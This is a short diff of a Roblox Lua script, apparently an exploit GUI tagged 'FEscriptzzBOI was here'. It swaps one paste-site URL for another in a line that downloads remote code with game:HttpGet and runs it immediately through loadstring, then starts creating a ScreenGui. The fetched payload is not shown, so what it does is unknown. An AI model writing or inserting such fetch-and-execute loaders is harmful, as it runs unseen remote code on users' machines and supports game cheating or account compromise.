@@ -2,7 +2,7 @@
 -- FEscriptzzBOI was here
 
 task.spawn(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/CnHVyrbr"))()
+loadstring(game:HttpGet("https://pastefy.app/dp0KtIFj/raw"))()
 end)
 
 local main = Instance.new("ScreenGui")
